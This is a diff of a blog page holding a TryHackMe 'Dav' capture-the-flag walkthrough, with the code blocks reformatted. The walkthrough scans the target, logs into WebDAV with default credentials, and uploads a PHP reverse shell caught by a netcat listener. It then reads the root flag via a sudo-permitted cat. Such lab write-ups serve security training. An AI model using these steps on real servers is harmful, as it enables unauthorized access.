@@ -5,7 +5,7 @@
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>Dav [TryHackMe] – Blog</title>
+    <title>Dav [TryHackMe] – Martin Kubecka | Blog</title>
     
 
 
@@ -18,9 +18,9 @@
 
 <script defer src="/js/lazysizes.min.fb649fcae62177dfe63e67081ddceb830b5ce1f05a4184e9bbb7d87ac4b8f4e5.js"></script>
 
-<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>
+<script defer src="/js/helper/getParents.min.086022fb02d7a1517e33c2670bffb976b3e80bcacd9caeee0c6a586064f20e42.js"></script>
 
-<script defer src="/js/helper/fadeinout.min.efa35f4c090622130b3f4cfae6971448b5ffb61c5f0a8f21cdfd157fa712abc4.js"></script>
+<script defer src="/js/helper/fadeinout.min.3ce954c8aea3b69cc5e6f734d8273ba4cd48d3a7987dbdca145849bc4b8fc296.js"></script>
 
 <script defer src="/js/helper/closest.min.js"></script>
   
@@ -1335,7 +1335,7 @@
 <meta name="author" content="Martin Kubecka">
 
 
-<meta property="og:site_name" content="Blog">
+<meta property="og:site_name" content="Martin Kubecka | Blog">
 <meta property="og:title" content="Dav [TryHackMe]">
 <meta property="og:url" content="https://martinkubecka.github.io/posts/thm/dav/">
 <meta property="og:type" content="article">
@@ -1345,12 +1345,12 @@
     <meta property="og:image" content="https://martinkubecka.github.io/images/thm/dav/icon.jpeg">
     <meta property="og:image:url" content="https://martinkubecka.github.io/images/thm/dav/icon.jpeg">
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:app:name:iphone" content="Blog">
+    <meta name="twitter:app:name:iphone" content="Martin Kubecka | Blog">
     <meta property="twitter:title" content="Dav [TryHackMe]">
     <meta property="twitter:description" content="Boot2root machine for FIT and bsides guatemala CTF">
   
 
-<meta name="generator" content="Hugo 0.80.0" />
+<meta name="generator" content="Hugo 0.93.3" />
 <meta name="msapplication-TileColor" content="#fff">
 
 <meta name="theme-color" content="#fff">
@@ -1398,7 +1398,7 @@
     },
     "publisher": {
       "@type": "Organization",
-      "name": "Blog",
+      "name": "Martin Kubecka | Blog",
       "url": "https://martinkubecka.github.io/"
     }
   }
@@ -1690,7 +1690,7 @@
   
   <li >
     
-      <a href="https://martinkubecka.github.io/" class="capitalize">Blog</a>
+      <a href="https://martinkubecka.github.io/" class="capitalize">Martin Kubecka | Blog</a>
     
   </li>
   
@@ -1808,7 +1808,7 @@
 <h4 id="nmap">NMAP</h4>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1816,18 +1816,18 @@
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -A -T4 10.10.237.27
-
-PORT   STATE SERVICE VERSION
-80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
-<span class="p">|</span>_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
-<span class="p">|</span>_http-title: Apache2 Ubuntu Default Page: It works
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -A -T4 10.10.237.27
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Apache2 Ubuntu Default Page: It works
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="directory-brute-forcing">Directory Brute-Forcing</h4>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1852,30 +1852,30 @@ PORT   STATE SERVICE VERSION
 </span><span class="lnt">23
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">gobuster dir -u http://10.10.237.27 -w /usr/share/wordlists/dirb/common.txt 
-<span class="o">===============================================================</span>
-Gobuster v3.0.1
-by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
-<span class="o">===============================================================</span>
-<span class="o">[</span>+<span class="o">]</span> Url:            http://10.10.237.27
-<span class="o">[</span>+<span class="o">]</span> Threads:        <span class="m">10</span>
-<span class="o">[</span>+<span class="o">]</span> Wordlist:       /usr/share/wordlists/dirb/common.txt
-<span class="o">[</span>+<span class="o">]</span> Status codes:   200,204,301,302,307,401,403
-<span class="o">[</span>+<span class="o">]</span> User Agent:     gobuster/3.0.1
-<span class="o">[</span>+<span class="o">]</span> Timeout:        <span class="nv">10s</span>
-<span class="o">===============================================================</span>
-2021/01/02 14:27:27 Starting <span class="nv">gobuster</span>
-<span class="o">===============================================================</span>
-/.hta <span class="o">(</span>Status: 403<span class="o">)</span>
-/.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>
-/.htaccess <span class="o">(</span>Status: 403<span class="o">)</span>
-/index.html <span class="o">(</span>Status: 200<span class="o">)</span>
-/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
-/webdav <span class="o">(</span>Status: 401<span class="o">)</span>
-<span class="o">===============================================================</span>
-2021/01/02 14:28:12 <span class="nv">Finished</span>
-<span class="o">===============================================================</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gobuster dir -u http://10.10.237.27 -w /usr/share/wordlists/dirb/common.txt 
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Gobuster v3.0.1
+</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:            http://10.10.237.27
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:        <span class="m">10</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:       /usr/share/wordlists/dirb/common.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Status codes:   200,204,301,302,307,401,403
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:     gobuster/3.0.1
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:        <span class="nv">10s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">2021/01/02 14:27:27 Starting <span class="nv">gobuster</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">/.hta <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/.htaccess <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/index.html <span class="o">(</span>Status: 200<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/webdav <span class="o">(</span>Status: 401<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">2021/01/02 14:28:12 <span class="nv">Finished</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="gaining-access">Gaining Access</h3>
 <h4 id="webdav">WebDAV</h4>
@@ -1912,7 +1912,7 @@ by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span 
 <strong>wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1921,14 +1921,14 @@ by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span 
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">hash-identifier 
---------------------------------------------------
- HASH: <span class="nv">$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91</span>
-
-Possible Hashs:
-<span class="o">[</span>+<span class="o">]</span> MD5<span class="o">(</span>APR<span class="o">)</span>
---------------------------------------------------
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hash-identifier 
+</span></span><span class="line"><span class="cl">--------------------------------------------------
+</span></span><span class="line"><span class="cl"> HASH: <span class="nv">$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Possible Hashs:
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> MD5<span class="o">(</span>APR<span class="o">)</span>
+</span></span><span class="line"><span class="cl">--------------------------------------------------
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>For working with WebDAV we will use <strong>cadaver</strong>:</p>
 <figure >
@@ -1945,7 +1945,7 @@ Possible Hashs:
 <p>Use default credentials and upload PHP reverse shell:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1957,17 +1957,17 @@ Possible Hashs:
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">cadaver http://http://10.10.237.27/webdav/
-Could not resolve hostname <span class="sb">`</span>http<span class="s1">&#39;: Host not found
-</span><span class="s1">dav://10.10.237.27/webdav/? open http://10.10.237.27/webdav/
-</span><span class="s1">Authentication required for webdav on server `10.10.237.27&#39;</span>:
-Username: wampp
-Password: 
-dav:/webdav/&gt; put php-reverse-shell.php
-Uploading php-reverse-shell.php to <span class="sb">`</span>/webdav/php-reverse-shell.php<span class="err">&#39;</span>:
-Progress: <span class="o">[=============================</span>&gt;<span class="o">]</span> 100.0% of <span class="m">5494</span> bytes succeeded.
-dav:/webdav/&gt; 
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cadaver http://http://10.10.237.27/webdav/
+</span></span><span class="line"><span class="cl">Could not resolve hostname <span class="sb">`</span>http<span class="s1">&#39;: Host not found
+</span></span></span><span class="line"><span class="cl"><span class="s1">dav://10.10.237.27/webdav/? open http://10.10.237.27/webdav/
+</span></span></span><span class="line"><span class="cl"><span class="s1">Authentication required for webdav on server `10.10.237.27&#39;</span>:
+</span></span><span class="line"><span class="cl">Username: wampp
+</span></span><span class="line"><span class="cl">Password: 
+</span></span><span class="line"><span class="cl">dav:/webdav/&gt; put php-reverse-shell.php
+</span></span><span class="line"><span class="cl">Uploading php-reverse-shell.php to <span class="sb">`</span>/webdav/php-reverse-shell.php<span class="err">&#39;</span>:
+</span></span><span class="line"><span class="cl">Progress: <span class="o">[=============================</span>&gt;<span class="o">]</span> 100.0% of <span class="m">5494</span> bytes succeeded.
+</span></span><span class="line"><span class="cl">dav:/webdav/&gt; 
+</span></span></code></pre></td></tr></table>
 </div>
 </div><figure >
   
@@ -1981,7 +1981,7 @@ dav:/webdav/&gt;
 </figure>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1994,25 +1994,25 @@ dav:/webdav/&gt;
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">nc -lnvp <span class="m">4444</span>
-listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
-connect to <span class="o">[</span>10.9.140.180<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.237.27<span class="o">]</span> <span class="m">43474</span>
-Linux ubuntu 4.4.0-159-generic <span class="c1">#187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span>
- 12:51:49 up <span class="m">27</span> min,  <span class="m">0</span> users,  load average: 0.00, 0.00, 0.00
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
-/bin/sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
-$ whoami
-www-data
-$ 
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -lnvp <span class="m">4444</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.9.140.180<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.237.27<span class="o">]</span> <span class="m">43474</span>
+</span></span><span class="line"><span class="cl">Linux ubuntu 4.4.0-159-generic <span class="c1">#187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span><span class="line"><span class="cl"> 12:51:49 up <span class="m">27</span> min,  <span class="m">0</span> users,  load average: 0.00, 0.00, 0.00
+</span></span><span class="line"><span class="cl">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/bin/sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
+</span></span><span class="line"><span class="cl">$ whoami
+</span></span><span class="line"><span class="cl">www-data
+</span></span><span class="line"><span class="cl">$ 
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="user-flag">User Flag</h4>
 <p>Located in <em>/home/merlin</em></p>
 <h3 id="root-flag">Root Flag</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -2023,16 +2023,16 @@ $
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">sudo -l
-Matching Defaults entries <span class="k">for</span> www-data on ubuntu:
-    env_reset, mail_badpass,
-    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
-
-User www-data may run the following commands on ubuntu:
-    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /bin/cat
-
-sudo cat /root/root.txt
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> www-data on ubuntu:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User www-data may run the following commands on ubuntu:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /bin/cat
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sudo cat /root/root.txt
+</span></span></code></pre></td></tr></table>
 </div>
 </div>
     </article>
@@ -2224,29 +2224,6 @@ sudo cat /root/root.txt
   
 </script>
     
-<div class="donation">
-  <div class="donation__message">
-    Share on
-  </div>
-  <div class="donation__icons">
-    
-    
-    
-      
-        <a href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fmartinkubecka.github.io%2fposts%2fthm%2fdav%2f" title="Facebook" aria-label="Facebook Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
-          <svg data-name="facebook" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m15.997 3.985h2.191v-3.816c-.378-.052-1.678-.169-3.192-.169-3.159 0-5.323 1.987-5.323 5.639v3.361h-3.486v4.266h3.486v10.734h4.274v-10.733h3.345l.531-4.266h-3.877v-2.939c.001-1.233.333-2.077 2.051-2.077z"/></svg>
-        </a>
-      
-    
-      
-        <a href="https://twitter.com/intent/tweet?text=Dav%20%5bTryHackMe%5d&url=https%3a%2f%2fmartinkubecka.github.io%2fposts%2fthm%2fdav%2f&hashtags=exploitation%2chash%20cracking%2cprivilege%20escalation&via=" title="Twitter" aria-label="Twitter Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
-          <svg data-name="twitter" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m21.534 7.113c.976-.693 1.797-1.558 2.466-2.554v-.001c-.893.391-1.843.651-2.835.777 1.02-.609 1.799-1.566 2.165-2.719-.951.567-2.001.967-3.12 1.191-.903-.962-2.19-1.557-3.594-1.557-2.724 0-4.917 2.211-4.917 4.921 0 .39.033.765.114 1.122-4.09-.2-7.71-2.16-10.142-5.147-.424.737-.674 1.58-.674 2.487 0 1.704.877 3.214 2.186 4.089-.791-.015-1.566-.245-2.223-.606v.054c0 2.391 1.705 4.377 3.942 4.835-.401.11-.837.162-1.29.162-.315 0-.633-.018-.931-.084.637 1.948 2.447 3.381 4.597 3.428-1.674 1.309-3.8 2.098-6.101 2.098-.403 0-.79-.018-1.177-.067 2.18 1.405 4.762 2.208 7.548 2.208 8.683 0 14.342-7.244 13.986-14.637z"/></svg>
-        </a>
-      
-    
-  </div>
-</div>
-
 
     
     
@@ -2272,7 +2249,7 @@ sudo cat /root/root.txt
     </div>
     <div class="whoami__desc">
       
-        Computer Science student interested in Penetration Testing, Cyber Defense, OSINT and Social Engineering
+        Cyber Security Analyst | Master&#39;s student of Computer Science
       
     </div>
     <div class="whoami__social">
@@ -2459,7 +2436,7 @@ sudo cat /root/root.txt
 </div>
 
 
-<script defer src="/js/swipe.min.b4b82839155519d9ca67746615a4c86ccbc1061c196fe6d8aa26e4fe22902718.js"></script>
+<script defer src="/js/swipe.min.9d61b979db5cc2a1ff3a5d410e881547a61b9d28bc23e811c49061d47df07ef3.js"></script>
 
 <script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
@@ -3481,7 +3458,7 @@ document.addEventListener('DOMContentLoaded', function () {
                 
             <p class="caption">
                 
-                    ©2022, All Rights Reserved
+                    ©2023, All Rights Reserved
                 
             </p>
         
